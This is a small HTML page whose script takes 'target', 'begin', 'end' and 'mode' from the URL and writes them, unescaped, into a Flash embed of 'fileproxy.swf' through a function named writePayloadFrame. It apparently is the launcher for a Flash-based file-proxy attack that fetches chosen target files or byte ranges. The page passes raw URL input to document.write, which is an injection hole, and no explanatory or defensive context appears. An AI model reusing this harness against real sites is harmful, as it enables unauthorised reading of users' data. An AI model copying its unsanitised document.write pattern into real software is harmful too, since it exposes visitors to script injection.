<body style="background: #322c35;">
<script>
function getURLParameter(name) {
  return decodeURIComponent((new RegExp('[?|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(location.search)||[,""])[1].replace(/\+/g, '%20'))||null
}

function writePayloadFrame(targetfile) {
	document.write('\
		<embed src="fileproxy.swf" \
		quality="high"\
		bgcolor="#ffffff"\
		width="550"\
		height="400"\
		name="der"     FlashVars="myPath=' + targetfile + '&myBegin='+ begin + '&myEnd='+ end + '&mySubject='+ mode + '"\
		align="middle"\
		allowScriptAccess="sameDomain"\
		allowFullScreen="false"\
		type="application/x-shockwave-flash"\
		pluginspage="http://www.adobe.com/go/getflash"\
		/>\
	');
}

var target = getURLParameter('target');
var begin = getURLParameter('begin');
var end = getURLParameter('end');
var mode = getURLParameter('mode');
writePayloadFrame(target);
</script>
</body>